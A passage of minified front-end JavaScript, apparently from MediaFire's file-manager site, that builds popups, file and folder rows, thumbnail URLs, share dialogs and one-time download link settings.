a&&(PW=a,h+=d+" PW(aResults);"),h+=' return false;" class="gbtnTertiary">'+(n||"OK")+'</a><a href="#" onclick="bfM(\'input_dialog_div\'); return false;" class="gbtnPrimary">Cancel</a></div>'),s.innerHTML=h,s.style.width="",s.style.height="",s.style.display="block",DoAPopup("input_dialog_div",r||QO(s),i||s.offsetHeight),c&&document.getElementById(c).focus()}function QS(e,t,a,o,n,r){var i=document.getElementById("message_dialog_div");i||((i=document.createElement("DIV")).id="message_dialog_div",document.body.appendChild(i)),i.className="popup "+(r||"");var s='<a href="#" onclick="HideAPopup(\'message_dialog_div\'); return false" class="popup-close"><span style="display: none;">Close Popup</span></a>';s+='<h3 class="popup-title">'+e+"</h3>",s+='<div class="popup-content"><p>'+t+"</p></div>";var l=!1;"function"==typeof o&&(QQ=o,l=!0),s+='<div class="popup-btns">';for(var d=0;a[d];d++){var c=!1;a[d][0]&&(c=a[d][3]?a[d][3]+"();":l?" QQ('"+a[d][0]+"');":"",s+='<a href="javascript:void(0)" class="'+("gbtnPrimary"==a[d][2]?"gbtnPrimary":"gbtnTertiary")+"\" onclick=\"bfM('message_dialog_div');"+c+'">'+(a[d][1]||a[d][0])+"</a>")}s+="</div>",i.innerHTML=s,i.style.width="",i.style.height="",i.style.display="block",DoAPopup("message_dialog_div",n&&n[0]?n[0]:QO(i),n&&n[1]?n[1]:i.offsetHeight,!0)}function bfZ(){return $("#modal_window_popup.popup").filter(":visible").length>0}function QU(){try{var e=$(".popup");e.length&&(e.map(aqv),e.find(".close").click(),e.find(".popup-close").click()),$("#modal_window_popup").map(aqv),$("#myfiles_sharing_popup").map(aqv),$("#modal_window_popup").removeClass("transparentBG"),"/blank.html"!==$("#modal_msg_iframe").attr("src")&&pN("/blank.html","modal_msg_iframe")}catch(e){}}function aqv(){this.id&&bfM(this.id)}function SC(e){switch(e.status){case"connected":SF();break;case"notConnected":case"unknown":default:SD()}}function SF(){var e=0x71aa3a8fee4b;FB.api(FBAPIVersion+"me/likes/"+e,(function(t){void 0===t.data[0]||t.data[0].id!=e?SD():SB()}))}function SB(){jQuery("#mf_like_heading").addClass("hide"),jQuery("#mf_like_box").addClass("hide"),jQuery(".social-follow:not(.myfiles-page)").removeClass("fb")}function SD(){jQuery("#mf_like_heading").removeClass("hide"),jQuery("#mf_like_box").removeClass("hide"),jQuery(".social-follow:not(.myfiles-page)").addClass("fb")}function formatBytes(e){if(0==e)return"0 b";var t=Math.log(e)/Math.log(1024);return Math.round(Math.pow(1024,t-Math.floor(t)),0)+" "+["b","KB","MB","GB","TB"][Math.floor(t)]}function debounce(e,t,a){var o;return function(){var n=this,r=arguments;function i(){a||e.apply(n,r),o=null}o?clearTimeout(o):a&&e.apply(n,r),o=setTimeout(i,t||100)}}aqY.apA(),function(e){function t(t){var a,o=this;t.relatedTarget?-1===e(t.relatedTarget).parents().andSelf().index(o)&&e(o).trigger("draghoverover"):setTimeout((function(){(a=e(o).data()).Tl?clearTimeout(a.Tl):e(o).trigger("draghoverover"),a.Tl=null}),0)}function a(t){var a,o=this;t.relatedTarget?-1===e(t.relatedTarget).parents().index(this)&&e(this).trigger("draghoverout"):(a=e(this).data()).Tl||(a.Tl=setTimeout((function(){a.Tl=null,e(o).trigger("draghoverout")}),e.browser.msie&&e.browser.version<9?50:25))}e.event.special.draghover={setup:function(){e(this).bind({"dragenter.mfdnd":t,"dragleave.mfdnd":a})},teardown:function(){e(this).unbind(".mfdnd")},add:function(t){var a=t.namespace,o=a?"draghoverover."+a+" draghoverout."+a:"draghoverover draghoverout";e(this).bind(o,(function(e){e.stopPropagation(),e.over=e.enter=!!e.type.match(/over$/i),e.out=e.leave=!e.over,t.handler.call(this,e)}))},remove:function(t){var a=t.namespace,o=a?"draghoverover."+a+" draghoverout."+a:"draghoverover draghoverout";e(this).unbind(o)}};var o=e([]);function n(t){o.each((function(){var a=e(this);this===t.target||a.has(t.target).length||a.triggerHandler("clickoutside",[t.target])}))}e.event.special.clickoutside={setup:function(){1===(o=o.add(this)).length&&e(document).bind("click",n)},teardown:function(){0===(o=o.not(this)).length&&e(document).unbind("click",n)},add:function(e){var t=e.handler;e.handler=function(e,a){e.target=a,t.apply(this,arguments)}}}}(jQuery),function(e){var t;e.fn.outerHTML=function(){var a,o=this[0];return o?"string"==typeof(a=o.outerHTML)?a:(t=t||e("<div/>")).html(this.eq(0).clone()).html():null}}(jQuery),function(){var e={};this.tmpl=function t(a,o){var n=/\W/.test(a)?new Function("obj","var p=[],print=function(){p.push.apply(p,arguments);};with(obj || {}){p.push('"+a.replace(/[\r\t\n]/g," ").replace(/'(?=[^\|]*\|\])/g,"\t").split("'").join("\\'").split("\t").join("'").replace(/\[\|=(.+?)\|\]/g,"',$1,'").split("[|").join("');").split("|]").join("p.push('")+"');}return p.join('');"):e[a]=e[a]||t(document.getElementById(a).innerHTML);return o?n(o):n}}();var sizeOf="function"==typeof Object.keys?function(e){return e?e.constructor==Array?e.length:"object"===(typeof e).toLowerCase()?Object.keys(e).length:0:0}:function(e){var t=0;for(var a in e)e.hasOwnProperty(a)&&t++;return t};function adv(){var e=Array.prototype.slice.call(arguments),t=!1;e.length&&"boolean"==typeof e[0]&&(t=e.shift());var a=e[0],o=GLB_fShareOrigin();return"convkey"==a&&(o=acz()),e.unshift(o||""),t&&(aBO()?e[0]=e[0].replace(/(:\/\/)([^.]+)(\.mediafire)/,"$1dev$3"):e[0]=e[0].replace(/(:\/\/)([^.]+)(\.mediafire)/,"$1www$3")),e.join("/")}function aNy(e){var t="";for(i=0;i<e.length;i++)e.charCodeAt(i)<128?t+=encodeURIComponent(e.charAt(i)):t+=e.charAt(i);return t}function bql(e){return aNy(e.replace(/\s/g,"_").replace(/-+/g,"-").replace(/_+/g,"_"))}function anK(e){var t=-1;try{t=new ActiveXObject(e)}catch(e){t={mj:!0}}return t}function acV(){var e=[{qv:"ShockwaveFlash.ShockwaveFlash.7"},{qv:"ShockwaveFlash.ShockwaveFlash.6"},{qv:"ShockwaveFlash.ShockwaveFlash"}],t=!1;if(navigator.plugins&&navigator.plugins.length>0){var a="application/x-shockwave-flash",o=navigator.mimeTypes;o&&o[a]&&o[a].enabledPlugin&&o[a].enabledPlugin.description&&(t=!0)}else if(-1==navigator.appVersion.indexOf("Mac")&&window.execScript)for(var n=0,r=e.length;n<r;n++){anK(e[n].qv).mj||(t=!0)}return t}function aiG(){$(window).height()<=1080?$("body").addClass("wHeightCondensed"):$("body").removeClass("wHeightCondensed"),$(window).width()<=960?$("body").addClass("siteMinWidth"):$("body").removeClass("siteMinWidth")}function aij(e,t,a,o,n){var r=$(e),i=$(t);r.bind("change keyup",(function(){("function"!=typeof n||n.call())&&(a>0&&r.val().length>a&&(r.val(r.val().substring(0,a)),r.change()),i.text(a&&o?a-r.val().length:r.val().length))})),r.change()}function avH(e,t){return(parseInt(e)>>parseInt(t))%2}function aMm(e,t){return e|1<<t}function aLG(e,t){return(e>>t)%2!=0}function aMd(e,t){return e&~(1<<t)}function aLf(e,t){return aLG(e,t)?aMd(e,t):aMm(e,t)}function LoadTemplatesFromSource(){var e={};return $("script.template").each((function(){e[this.id]=window.tmpl(this.id)})).remove(),e}function awS(e,t){var a=e&&e.hash?e.hash:e.quickkey;$.ajax({type:"GET",url:"/dynamic/dmca_ticket_quickkey.php?r="+aC(4),dataType:"json",timeout:1e3,data:{quick_key:a,response_format:"json",nocache:Math.round(1e3*Math.random())},success:t.success||t,error:t.error||function(){}})}function ayj(e){var t=e.substring(0,1);return parseInt(t,16)+1}function bcY(e){for(var t=e+"";t.length<2;)t="0"+t;return t}function blZ(e){"undefined"!=typeof aVl&&aVl;"undefined"!=typeof bdk&&bdk||aOr();var t=new Date;if(e){var a=t.toLocaleString();return"Invalid Date"!=a?a:"Not available"}var o={bnT:t.getFullYear()||0,month:bcY(parseInt(t.getMonth())+1)||0,date:bcY(t.getDate())||0,hours:bcY(t.getHours())||0,minutes:bcY(t.getMinutes())||0,seconds:bcY(t.getSeconds())||0};return o.bnT+"-"+o.month+"-"+o.date+" "+o.hours+":"+o.minutes+":"+o.seconds}function bdj(e,t){var a="undefined"!=typeof aVl&&aVl||0;a/=3600;var o="undefined"!=typeof bdk&&bdk||aOr(),n=new Date(new Date(aRR(e)).getTime()+36e5*(o-a));if(t){var r=n.toLocaleString();return"Invalid Date"!=r?r:"Not available"}var i={bnT:n.getFullYear()||0,month:bcY(parseInt(n.getMonth())+1)||0,date:bcY(n.getDate())||0,hours:bcY(n.getHours())||0,minutes:bcY(n.getMinutes())||0,seconds:bcY(n.getSeconds())||0};return i.bnT+"-"+i.month+"-"+i.date+" "+i.hours+":"+i.minutes+":"+i.seconds}function aRR(e){var t=e.split(" "),a=t[0].split("-"),o="January";switch(a[1]){case"02":o="February";break;case"03":o="March";break;case"04":o="April";break;case"05":o="May";break;case"06":o="June";break;case"07":o="July";break;case"08":o="August";break;case"09":o="September";break;case"10":o="October";break;case"11":o="November";break;case"12":o="December"}return o+" "+a[2]+", "+a[0]+" "+t[1]}function aye(e){acS={},e.parent_chunk||(e.parent_chunk=1),acS.file_count_total=0,acS.folder_count_total=0,e.selected||(acS.selected=!1),acS.bIsCameraUploadFolder=!1,(e.parent&&"myfiles"===e.parent.folderkey||e.parent_folderkey&&"myfiles"===e.parent_folderkey)&&"Camera"===e.name&&(acS.bIsCameraUploadFolder=!0),window.tH.currentFolder.folders[e.folderkey]&&window.tH.currentFolder.folders[e.folderkey].selected&&!0===window.tH.currentFolder.folders[e.folderkey].selected&&(acS.selected=!0),acS.file_count=window.tH.currentFolder.folders[e.folderkey]?window.tH.currentFolder.folders[e.folderkey].file_count:e.file_count||0,acS.file_count_text=acS.file_count_total>e.file_count?"("+(acS.file_count_total-e.file_count)+" in subfolders)":"",acS.folder_count_text=acS.folder_count_total>sizeOf(e.folders)?"("+(acS.folder_count_total-sizeOf(e.folders))+" in subfolders)":"",void 0===e.custom_url&&(acS.custom_url=!1),void 0===e.shared&&(acS.shared=!1),void 0===e.dropbox_enabled&&(acS.dropbox_enabled=!1),void 0===e.owner_name&&(acS.owner_name=""),void 0===e.folder_count&&(acS.folder_count=0),void 0===e.itemrownum&&(acS.itemrownum=""),void 0===e.avatar&&(acS.avatar=""),acS.newclass=!!e.newclass,!e.created&&window.tH.currentFolder.folders[e.folderkey]&&(e.created=window.tH.currentFolder.folders[e.folderkey].created),e.timezone_adjusted||(e.delete_date&&(acS.delete_date=bdj(e.delete_date)),e.created?acS.created=bdj(e.created):acS.created="0000-00-00 00:00:00",acS.timezone_adjusted=!0),acS.delete_date||(acS.delete_date="");var t=$.extend(e,acS);return t.folder_class="row_container mf_filecontainer folder cf",t.folder_class+=t.newclass?" new":"",t.folder_class+=" "+t.privacy,t.folder_class+=t.custom_url?" customurl-active":"",t.folder_class+="yes"==t.shared?" collaborate-active":"",t.folder_class+="yes"==t.dropbox_enabled?" dropbox":"",t.folder_class+=t.selected?" file_selected":"",t.folder_class+=void 0!==t.shared_by_user&&1==t.shared_by_user?" sharedByUser":"",t.folder_class+=t.bIsCameraUploadFolder?" cameraUploads":"",t}function ayw(e){return!(!e.status||1!=avH(e.status,15))}function axi(){var e=window.location.hostname;return e.toLowerCase().indexOf("dev.",0)>=0||e.toLowerCase().indexOf("local.",0)>=0?"dev#":"www#"}function getImageThumbURL(e,t,a,o,n,r){var i;return o=o||!1,i=window.location.protocol+"//",i+=(aBO()||isLOCALDEV()?"dev":"www")+(parseInt(a.charAt(0),16)+1)+".mediafire.com/",aBO()||o?(i+="conversion_server.php?"+a.substr(0,4)+"&doc_type=i&quickkey="+e+"&size_id="+t+(o?"&request_conversion_only=1":""),n&&aEQ.adG&&(i+="&session_token="+aEQ.adG.session_token),r&&(i+="&timestamp="+r)):i+="convkey/"+a.substr(0,4)+"/"+e+t+"g.jpg",i}function aBM(e,t,a,o){var n;return a=a||!1,n=window.location.protocol+"//",n+=(aBO()?"dev":"www")+(parseInt(t.charAt(0),16)+1)+".mediafire.com/",n+="conversion_server.php?"+t.substr(0,4)+"&doc_type=d&quickkey="+e+"&page=1&output=img&size_id="+o,a&&(n+="&request_conversion_only=1&metadata=1"),n}function akl(e,t){var a={};e.parent_chunk||(e.parent_chunk=1);var o=aCf(e);if(a.imageSupported="image"===e.filetype&&o,a.previewSupported=1===avH(e.flag,2)&&o,a.editSupported=1===avH(e.flag,4)&&aGe(e),a.fileExtension=-1!==e.filename.indexOf(".")?$.trim(e.filename.substr(e.filename.lastIndexOf(".")+1,4)).toLowerCase():"",a.mimeType=e.mimetype?e.mimetype.replace("/","_"):"",!e.mimetype||"application/pdf"!=e.mimetype&&"application/x-pdf"!=e.mimetype||(a.fileExtension="pdf"),a.dmca=1==avH(e.flag,3)||1==avH(e.flag,0),a.copyright=1==avH(e.flag,5),a.servernum=e.hash?axi().replace("#",ayj(e.hash)):0,a.restricted=1==avH(e.flag,6),a.wordfilterblock=1==avH(e.flag,7),a.fileInfected=1==avH(e.flag,8),a.thumb6ready=!(1!=avH(e.status,6)&&!ayw(e)&&!e.thumb6ready),a.thumb3ready=!!(1==avH(e.status,3)||window.tH.aRK&&window.tH.aRK[e.quickkey]||ayw(e)||e.thumb3ready),a.thumb2ready=!!(1==avH(e.status,2)||window.tH.aRE&&window.tH.aRE[e.quickkey]||ayw(e)||e.thumb2ready),a.thumb1ready=!!(1==avH(e.status,1)||window.tH.aRp&&window.tH.aRp[e.quickkey]||ayw(e)||e.thumb1ready),void 0===e.itemrownum&&(a.itemrownum=""),void 0===e.flag?a.shared=!1:a.shared=0==avH(e.flag,1),a.newclass=!!e.newclass,a.imgpath_0g="",a.imgpath_1g="",a.imgpath_2g="",a.imgpath_3g="",e.hash&&(a.previewSupported&&"image"!=e.filetype?(a.imgpath_1g="conversion_server.php?"+e.hash.substr(0,4)+"&doc_type=d&quickkey="+e.quickkey+"&page=1&output=img&size_id=2",a.imgpath_2g="conversion_server.php?"+e.hash.substr(0,4)+"&doc_type=d&quickkey="+e.quickkey+"&page=1&output=img&size_id=1",a.imgpath_3g="conversion_server.php?"+e.hash.substr(0,4)+"&doc_type=d&quickkey="+e.quickkey+"&page=1&output=img&size_id=0"):(a.imgpath_0g="convkey/"+e.hash.substr(0,4)+"/"+e.quickkey+"0g.jpg",a.imgpath_1g="convkey/"+e.hash.substr(0,4)+"/"+e.quickkey+"1g.jpg",a.imgpath_2g="convkey/"+e.hash.substr(0,4)+"/"+e.quickkey+"2g.jpg",a.imgpath_3g="convkey/"+e.hash.substr(0,4)+"/"+e.quickkey+"3g.jpg")),e.delete_date)a.parent_name="Trash",a.parent_folderkey="trash",a.clickLink="#trash",a.onClickLink="void(0); return false;";else if(a.previewSupported&&"image"==e.filetype){if(e.parent.folderkey&&""!=e.parent.folderkey&&"myfiles"!=e.parent.folderkey)a.clickLink=adv("view",e.quickkey,Encoder.XSSEncode(aNy(e.filename)));else if(afQ)afI?a.clickLink=adv("view",afI,"gallery#"+e.quickkey):a.clickLink=adv("view",e.quickkey,Encoder.XSSEncode(aNy(e.filename)));else{var n=tH.folders.yx(e.parent_folderkey);n&&e.parent_folderkey&&n.name,a.clickLink=adv("view",e.quickkey,Encoder.XSSEncode(aNy(e.filename)))}a.onClickLink=""}else a.previewSupported?a.onClickLink="fFileChoicePopup.open('"+e.quickkey+"');":a.onClickLink="window.MYF_DirectDownload({files: ['"+e.quickkey+"']});",a.onClickLink+=" return false;",a.clickLink=agW(e),"https:"===window.location.protocol&&(a.clickLink=a.clickLink.replace(/^http\:/i,"https:"));if(e.selected||(a.selected=!1),window.tH.currentFolder.files[e.quickkey]&&window.tH.currentFolder.files[e.quickkey].selected&&!0===window.tH.currentFolder.files[e.quickkey].selected&&(a.selected=!0),t&&t.axn&&e.size&&!isNaN(parseInt(t.axn))&&parseInt(e.size)>parseInt(t.axn)&&(a.imgpath_0g="images/imgerrs/31-0.jpg",a.imgpath_1g="images/imgerrs/31-1.jpg",a.imgpath_2g="images/imgerrs/31-2.jpg",a.imgpath_3g="images/imgerrs/31-3.jpg"),a.showicon=!0,a.showthumb=!1,a.previewSupported){var r=0;($("#myfiles_wrap").hasClass("sizeS")||"S"==aL("mfsize"))&&(r=1),($("#myfiles_wrap").hasClass("sizeM")||"M"==aL("mfsize"))&&(r=2),($("#myfiles_wrap").hasClass("sizeL")||"L"==aL("mfsize"))&&(r=3),$("#myfiles_wrap").hasClass("listView")&&(r=0),1!=a["thumb"+r+"ready"]&&"image"!=e.filetype||(a.showthumb=a["imgpath_"+r+"g"],a.showicon=!1)}return a.showThumbnail=!!aCf(e),a.isDocument=!!aCz(e),a.docThumbnail=1==a.isDocument&&1==a.showThumbnail?aBM(e.quickkey,e.hash):"",e.timezone_adjusted||(e.delete_date&&(a.delete_date=bdj(e.delete_date)),a.created=bdj(e.created),a.timezone_adjusted=!0),a.delete_date||(a.delete_date=""),e.downloads||(a.downloads=0),$.extend(e,a)}function aoZ(e){var t={};return t.previewSupported="image"!==e.filetype&&aCf(e),t.shareUrl=agW(e),e.previewurl&&(t.shareUrl=e.previewurl),e.hash||(e.hash=""),t.imageViewUrl=t.shareUrl,t.imageUrl=adv(!0,"convkey",e.hash.substr(0,4),e.quickkey+"4g.jpg"),t.imageUrl=t.imageUrl.replace(/^http:/i,"https:"),t.encodedImage=Encoder.htmlEncode('<a href="'+t.imageViewUrl+'" target="_blank"><img src="'+t.imageUrl+'" border="0" alt="Simple, Free Image and File Hosting at MediaFire" /></a>'),t.encoded=Encoder.htmlEncode('<a href="'+t.shareUrl+'" target="_blank">'+t.shareUrl+"</a>"),t.urlFile=agW(e,"download"),t.urlImg=adv(!0,"convkey",e.hash.substr(0,4),e.quickkey+"6g.jpg"),t.urlImg=t.urlImg.replace(/^http:/i,"https:"),t.urlI=agW(e),$.extend(e,t)}function aNR(e,t){$("#sharebox").hasClass("premiumUser")||$("#freeOneTimeRemaining").prepend("Free ");var a=function(){tH.user_info||(tH.user_info={});var a=parseInt(tH.user_info.one_time_key_request_max_count,10),o=0;a&&(o=Math.max(0,a-e),$("#sharebox-onetimedownload #OneTimeRemaining span").html(o)),0==fu&&$("#OneTimeRemaining").show(),(t.one_time_download_error_message||t.links&&t.links[0].one_time_download_error_message)&&($("#sharebox-onetimedownload form").hide(),$("#onetimedownload-error").html(t.one_time_download_error_message).show()),a&&!o&&($("#sharebox-onetimedownload form").hide(),$("#sharebox").hasClass("premiumUser")?($("#sharebox-onetimedownload #proOneTimeExpire span").html(a),$("#sharebox-onetimedownload #proOneTimeExpire").show()):$("#sharebox-onetimedownload #freeOneTimeExpire").show())};tH.user_info&&tH.user_info.one_time_key_request_max_count?a():(new window.tH.Dv).Yw((function(e){var t=e.response;t.user_info&&t.user_info.one_time_key_request_max_count&&(tH.user_info?tH.user_info.one_time_key_request_max_count=t.user_info.one_time_key_request_max_count:tH.user_info=t.user_info),a()}))}function MYF_fGetOneTimeKey(e){return e.split("?")[1]}function MYF_fGetDefaultOneTimeLink(e,t){return t&&null!==t&&e[t]?e[t]:e.view?e.view:e.watch&&"function"!=typeof e.watch?e.watch:e.download}function MYF_ConfigHandlerOneTimeDownloadLink(e){var t=24*parseInt($("#sharebox-onetimedownload select").val(),10)*60,a=$('#sharebox-onetimedownload input[name="one_time_email"]').is(":checked");function o(){tH.Cp.MFAPI_ConfigureOneTimeKey(e,{data:{email_notification:a?"yes":"no",duration:t}},{success:function(){try{Zi(0,"Successfully updated 1-Time Download Link!")}catch(e){}}})}$("#sharebox-onetimedownload select").off("change").on("change",(function(){t=24*parseInt(this.value,10)*60,o()})),$('#sharebox-onetimedownload input[name="one_time_email"]').off("change").on("change",(function(){a=$(this).is(":checked"),o()}))}function aLN(e,t,a){var o=new window.tH.Cp(e),n="no",r=24*$("#sharebox-onetimedownload select").val()*60;$('#sharebox-onetimedownload input[name="one_time_email"]').is(":checked")&&(n="yes");o.MFAPI_GetLinks({link_type:"one_time"},{success:function(e){if(e.links[0].one_time_key_error_message)window.av(),window.Zi(0,e.links[0].one_time_key_error_message);else{var t="#sharebox-onetimedownload .copy-link",o=MYF_fGetOneTimeKey(e.links[0].one_time.download),i=MYF_fGetDefaultOneTimeLink(e.links[0].one_time,a);if($("#one_time_download_link")[0].value=i,aNR(e.one_time_key_request_count,e),window.QC)$("#sharebox-onetimedownload .copy-link").off("click").on("click",(function(e){window.QC(i),aeV(e)}));else if(Clipboard.isSupported()){new Clipboard(t[0],{text:function(e){return i}}).on("success",(function(e){try{parent.gtag("event","copy_link")}catch(e){}Zi(0,"Copied to Clipboard")}))}else t.hide();"yes"!==n&&43200===r||tH.Cp.MFAPI_ConfigureOneTimeKey(o,{data:{email_notification:n,duration:r}},{success:function(){}}),MYF_ConfigHandlerOneTimeDownloadLink(o)}},error:function(){t||(window.av(),window.Zi(0,"An unknown error has occurred."))}})}function aNN(e){new window.tH.Cp(e).aNW({data:{get_counts_only:"yes"}},{success:function(e){aNR(e.one_time_key_request_count,e)},error:function(){}})}function apO(e){var t={};return t.shareUrl=agW(e),t.rssUrl=adv("rss.php?key="+e.folderkey),t.encoded=Encoder.htmlEncode('<a href="'+t.shareUrl+'" target="_blank">'+t.shareUrl+"</a>"),$.extend(e,t)}function apX(){return!!(window.tH&&window.tH.Cp&&window.tH.yJ)&&(window.tH.Cp.WF=function(e){var t=$.extend({},e);return t.parent=t.parent&&t.parent.folderkey,JSON.stringify(t)},window.tH.Cp.Wm=function(e){var t=JSON.parse(e);return new window.tH.Cp(t)},window.tH.yJ.WF=function(e){var t=$.extend({},e);return t.parent=t.parent&&t.parent.folderkey,t.folders=$.map($.values(t.folders),(function(e){return e.folderkey})),t.files=$.map($.values(t.files),(function(e){return e.quickkey})),JSON.stringify(t)},window.tH.yJ.Wm=function(e){var t=JSON.parse(e);return new window.tH.yJ(t)},window.tH.folders=new XV("folder",window.tH.yJ.WF,window.tH.yJ.Wm),window.tH.files=new XV("file",window.tH.Cp.WF,window.tH.Cp.Wm),!0)}function R(e,t){var a="";e.files&&e.files.length>0&&(a+="&files="+e.files.join(",")),e.folders&&e.folders.length>0&&(a+="&folders="+e.folders.join(","));var o="/widgets/share.php?web=1";t&&(o+="&preemptive=1"),blu(o+a,550,368,{transparent:!0,delayRender:!0})}$((function(){jQuery.fx.interval=22,aiG(),$(window).resize((function(){aiG()}))}));var CloseSharePopup,aJ={};function ValidateFolderCopyLinkSafe(e){function t(){QU(),QS("Warning","There are private files in this folder. Private files will not be visible if this folder is shared.",[["continue","Continue"],["cancel","Cancel","grey"]],(function(e){}))}new tH.yJ(e).aEn({data:{content_type:"files",filter:"private",version:APIVERSION}},{success:function(e,a,o){a.length>0?t():e.aEn({data:{content_type:"folder",filter:"private",version:APIVERSION}},{success:function(e,a,o){a.length>0&&t()}.bind(this),error:function(){}},1)}.bind(this),error:function(){}},1)}function CreateSharePopup(e,t){return function(){var a=$("#"+e).popup(),o=a.data("popup"),n=[],r=[],i=[],s={},l={};function d(e){e?a.closest(".popup").addClass("popup-uploader-mode"):a.closest(".popup").removeClass("popup-uploader-mode")}var c,f,u,p,h,m=function(e){0!=e.length&&parent.ValidateFolderCopyLinkSafe(e[0].folderkey)}.bind(this);function g(e,l,d,c,f,u,p,h){var g=function(e,t){acK||t?($("#sharebox").addClass("nonOwner"),$(".share-status-toggle").hide()):($("#sharebox").removeClass("nonOwner"),$(".share-status-toggle").show().text(e?"Enable Link":"Disable Link")),$("#sharebox").removeClass("collabshare collabshare-manage"),e?$("#sharebox").addClass("publicDisabled"):$("#sharebox").removeClass("publicDisabled disabledAlert"),e};if(r.length){var v=!1;if($.each(r,(function(){if("myfiles"==this.folderkey)return v=!0,!1})),v)return Zi(0,"You cannot share your My Files root folder"),!1}if(aAy=!1,"file_preview"==e&&(aAy=!0),bhz=!1,"media_preview"==e&&(bhz=!0),bgy=!1,"file_download"==e&&(bgy=!0),CloseSharePopup=y,n.length+r.length>1){var w=!1,b=!1,_={name:"Multiple Items"},k=[],x=[];if($.each(n,(function(e,t){k.push(t.filename),x.push(t.quickkey),t.privacy&&(w=!0),t.shared&&(b=!0)})),$.each(r,(function(e,t){k.push(t.name),x.push(t.folderkey),t.privacy&&(w=!0),t.shared&&(b=!0)})),_.emailnames=k.join(";;"),_.multikey=x.join(","),_.emailkeys=x.join(";;"),b&&$("#sharebox").addClass("collabshare"),aAy){var H="#"+aNy(window.location.hash.replace("#",""));_.shareUrl=adv("view",_.multikey,"gallery"+(H.length>1?H:""))}else _.shareUrl=adv("folder",_.multikey,"shared");_.encoded=Encoder.htmlEncode('<a href="'+_.shareUrl+'" target="_blank">'+_.shareUrl+"</a>"),a.html(t.multi_share(_));g(w,b),acK?$(".share-status-toggle").hide():$(".share-status-toggle, .share-link-enable").on("click",(function(e){var t,a;t=function(e,t){e>=n.length&&t>=r.length&&g(w=!w,b)},a=0,function e(o,i){var s="file"==i&&n[o]?n[o].quickkey:null,l="folder"==i&&r[o]?r[o].folderkey:null;if("file"==i&&!s)return a=o,void e(0,"folder");"folder"!=i||l?LF.aah(w?"public":"private",s,l,!1,(function(){e(o+1,i)})):t(a,o)}(0,"file")}))}else if(n.length){if(n[0].shared&&(NZ(n[0]),$("#sharebox").addClass((function(){return"3"==NZ(n[0])?"collabshare-manage":"collabshare"}))),n[0].previewurl=agW(n[0],"view"),aAy){H="#"+aNy(window.location.hash.replace("#",""));var C=n[0].filetype,E=n[0].filename;"selected"==C&&(E="gallery"),n[0].previewurl=adv("view",n[0].quickkey,aNy(E)+(("gallery"==C||"selected"==C)&&H.length>1?H:""))}if(bhz&&(n[0].filetype=$("body").hasClass("video")?"video":"audio",n[0].previewurl=agW(n[0],"view")),a.html(t.file_share(aoZ(n[0]))),acK||h)$(".ShareDialog-createOneTimeLink").hide();else if(fu){var I=$("#sharebox-onetimedownload");aNN(n[0].quickkey),$("#one_time_download_button").click((function(){aLN(n[0].quickkey,!0)})),$("#sharebox").hasClass("premiumUser")||I.find("#freeOneTimeRemaining").show()}else $("#one_time_download_button").prop("onclick",null).off("click").on("click",(function(e){try{if(!parent.PremiumUpsellLightbox)throw new Error;parent.bfM("modal_window_popup"),parent.PremiumUpsellLightbox.showUpsell("pro","one_time_links")}catch(e){window!=parent&&(window.location="/widgets/premium_upsell.php?plan=pro&event=one_time_links")}aeV(e)}));if(g(n[0].privacy,n[0].shared),acK)$(".share-status-toggle").hide();else{if(!window.LF){var T=new tH.Dv;aaK=(new Date).getTime(),window.LF=new asR(T,!1,aaK,54e5,!0),aqg=setInterval((function(){LF.ahE(T)}),36e4)}$(".share-status-toggle, .share-link-enable").on("click",(function(e){LF.aah(n[0].privacy?"public":"private",n[0].quickkey,null,!1,(function(){n[0].privacy=!n[0].privacy,g(n[0].privacy,n[0].shared)}))}))}}else r.length&&(r[0].shared&&("3"!=NZ(r[0])&&$("#sharebox").addClass("publicDisabled"),$("#sharebox").addClass((function(){return"3"==NZ(r[0])?"collabshare-manage":"collabshare"}))),a.html(t.folder_share(apO(r[0]))),g(r[0].privacy,r[0].shared),acK?$(".share-status-toggle").hide():$(".share-status-toggle, .share-link-enable").on("click",(function(e){LF.aah(r[0].privacy?"public":"private",null,r[0].folderkey,!0,(function(){r[0].privacy=!r[0].privacy,g(r[0].privacy,r[0].shared)}))})));u&&(p&&a.addClass("web-widget"),a.parent().parent().find("a.popup-close").remove()),d&&$("#sharebox-email").addClass(d),a.find(".tabs").children("div").hide(),u?o.open(!1,0,0):o.open();var M=function(){S(),F()},B=function(){a.find("#sharebox-contacts").remove(),c?a.find("#current-contactsWrap").remove():f&&F()},L=function(){l&&!f?"undefined"!=typeof bjI?M():LoadJS(sCDNUrl+"/js/contacts_"+BUILD_VERSION+".js",(function(){return"undefined"!=typeof bjI}),M,4,B):B()};(new window.tH.aBS).boU({success:function(e){(s=e.response?e.response.sources:{})[0]="User",L()},error:function(){L()}}),c&&!f&&(a.find("#addContactPermissions").remove(),a.find(".addContactSettings span").remove()),n[0]&&aCf(n[0])||aAy||bhz||a.find("#sharebox-copylink").remove();var O=a.find(".copy-link");try{O.on("click",(function(){try{var e=$(this).prev("input").val();top.postMessage("mf-share-"+e,"*")}catch(t){try{e=$(this).prev("input").val();postMessage("mf-share-"+e,"*")}catch(e){}}}))}catch(e){}try{Clipboard.isSupported()&&(i.forEach((function(e){e&&e.destroy()})),i=[],a.find(".copy-link").each((function(e,t){var a=new Clipboard(t,{text:function(e){return $(e).prev("input").val()||""}});a.on("success",(function(e){try{parent.gtag("event","copy_link")}catch(e){}try{Zi(0,"Copied to Clipboard")}catch(e){}try{m(r)}catch(e){}})),i.push(a)})))}catch(e){}try{top.onLegacyCopyLink?O.on("click",(function(){top.onLegacyCopyLink($(this).prev("input").val()),m(r)})):window.QC&&O.on("click",(function(){window.QC($(this).prev("input").val()),m(r)}))}catch(e){}a.find("#email_files_to").val(""),a.find("#email_files_message").val(""),$("#sharebox").hasClass("publicDisabled")||a.find("input.ShareDialog-linkInput:visible").focus(),a.bind("click",(function(e){aeV(e)}))}function y(){CloseSharePopup=0,o.close(),$(".popup").removeClass("popup-uploader-mode")}function v(){var e=$(this),t=e.val().length,a=e.data("input-length"),o=!0;return t>a?o=!1:e.parent().find("em.remaining").html(a-t),o}$("#page_screen, #popup-section:not(.dlr), #popup-dialogs").click((function(e){a.is(":visible")&&(o.close(),window.parent.$("#modal_window_closer").click(),aeV(e))})),$("#popup-section 